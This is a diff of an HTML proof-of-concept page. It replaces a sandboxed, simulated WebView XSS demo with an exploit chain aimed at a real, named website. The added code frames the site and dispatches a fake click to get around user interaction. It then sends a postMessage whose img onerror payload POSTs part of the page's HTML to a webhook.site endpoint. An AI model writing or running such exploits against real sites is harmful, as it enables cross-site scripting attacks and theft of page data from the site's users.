@@ -1,93 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <title>🔥 Final XSS Chain PoC</title>
   <meta charset="utf-8">
-  <title>🔥 WebView XSS PoC</title>
   <style>
-    body {
-      background: #f5f5f5;
-      color: #333;
-      font-family: Consolas, monospace;
-      padding: 1rem;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    .disclaimer {
-      background: #fff8e1;
-      border-left: 4px solid #ffc107;
-      padding: 1rem;
-      margin-bottom: 1rem;
-    }
-    iframe {
-      width: 100%;
-      height: 300px;
-      border: 1px solid #ccc;
-      margin-top: 1rem;
-    }
-    button {
-      background: #e53935;
-      color: white;
-      font-weight: bold;
-      padding: 0.5rem 1rem;
-      border: none;
-      cursor: pointer;
-      border-radius: 4px;
-    }
-    #log {
-      background: #fff;
-      border: 1px solid #ccc;
-      padding: 1rem;
-      margin-top: 1rem;
-      white-space: pre-wrap;
-      font-size: 0.9rem;
-    }
+    body { font-family: sans-serif; background: #111; color: #eee; padding: 30px; }
+    iframe { border: 2px solid #444; width: 100%; height: 500px; margin-top: 20px; }
   </style>
 </head>
 <body>
+  <h1>☠️ DOM XSS Chain on thebrowser.company</h1>
+  <p>Exploiting postMessage → React injection → CSP bypass → DOM access</p>
 
-<div class="disclaimer">
-  <h3>⚠️ Security Demonstration</h3>
-  <p>This is a simulated vulnerable WebView. It demonstrates what happens when untrusted HTML is injected directly into the DOM.</p>
-</div>
+  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
 
-<h2>🔥 Arc WebView XSS PoC</h2>
-<p>Click the button below to send a <strong>malicious payload</strong> to the simulated WebView:</p>
-<button onclick="sendXSS()">💥 Send XSS Payload</button>
-
-<iframe id="webview" srcdoc="
-  <!DOCTYPE html>
-  <html>
-  <body style='font-family: Arial; padding: 1rem; background: #fffbe6;'>
-    <h3>🧪 Vulnerable WebView</h3>
-    <div id='output'>[waiting for message]</div>
-    <script>
-      window.addEventListener('message', (e) => {
-        const output = document.getElementById('output');
-        if (e.data?.dangerousHTML) {
-          output.innerHTML = e.data.dangerousHTML;
-        } else {
-          output.textContent = '[Invalid or safe message]';
-        }
+  <script>
+    const payload = `<img src=x onerror="(() => {
+      document.body.click?.();
+      document.body.focus?.();
+      alert('🔥 XSS triggered!');
+      fetch('https://webhook.site/your-id', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: document.documentElement.innerHTML.slice(0, 1000)
       });
-    </script>
-  </body>
-  </html>
-"></iframe>
+    })()">`;
 
-<div id="log">[log will appear here]</div>
+    const message = {
+      message: "OB_SHOULD_SHOW_PICKER",
+      content: {
+        marketerId: [payload]
+      }
+    };
 
-<script>
-function sendXSS() {
-  const payload = {
-    dangerousHTML: `<script>alert('🔥 XSS confirmed')</script>`
-  };
-  const frame = document.getElementById('webview');
-  frame.contentWindow.postMessage(payload, '*');
-  document.getElementById('log').textContent =
-    '📤 XSS Payload sent:\n' +
-    JSON.stringify(payload, null, 2);
-}
-</script>
+    const iframe = document.getElementById("target");
 
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+
+      // تحايل على تفاعل المستخدم: dispatchEvent + click/focus
+      setTimeout(() => {
+        const event = new Event("click");
+        document.body.dispatchEvent(event);
+
+        console.log("🚀 Sending postMessage payload...");
+        iframe.contentWindow.postMessage(message, "*");
+      }, 1000);
+    };
+  </script>
 </body>
 </html>
